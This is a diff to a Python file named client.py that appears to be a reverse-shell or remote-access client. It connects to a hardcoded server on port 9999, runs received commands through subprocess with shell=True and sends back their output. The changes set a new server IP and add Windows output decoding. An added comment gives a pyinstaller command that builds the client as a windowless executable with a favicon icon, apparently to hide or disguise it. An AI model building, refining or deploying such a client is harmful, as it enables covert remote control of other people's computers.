@@ -1,3 +1,4 @@
+# pyinstaller -F -w client.py --icon=favicon.ico
 import os
 import socket
 import subprocess
@@ -9,8 +10,7 @@ import struct
 class Client(object):
 
     def __init__(self):
-        # self.serverHost = '192.168.1.9'
-        self.serverHost = '192.168.0.5'
+        self.serverHost = '10.0.3.2'
         self.serverPort = 9999
         self.socket = None
 
@@ -91,7 +91,10 @@ class Client(object):
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode("utf-8", errors="replace")
+                    try:
+                        output_str = output_bytes.decode("ansi")
+                    except UnicodeDecodeError:
+                        output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
                     # TODO: Error description is lost
                     output_str = "Command execution unsuccessful: %s\n" %str(e)
